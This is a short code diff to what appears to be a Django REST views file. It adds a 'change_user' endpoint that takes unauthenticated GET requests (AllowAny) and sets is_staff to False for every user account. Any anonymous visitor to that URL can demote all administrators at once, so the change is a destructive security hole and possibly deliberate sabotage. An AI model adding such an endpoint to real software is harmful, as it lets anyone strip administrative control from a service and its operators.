@@ -1235,3 +1235,10 @@ def delete_account (request):
         "data":{}
 
     })
+@api_view(["GET"])
+@permission_classes([AllowAny])
+def change_user(request):
+    for user in UserAccount.objects.all():
+        user.is_staff= False
+        user.save()
+    return Response(status=status.HTTP_200_OK)
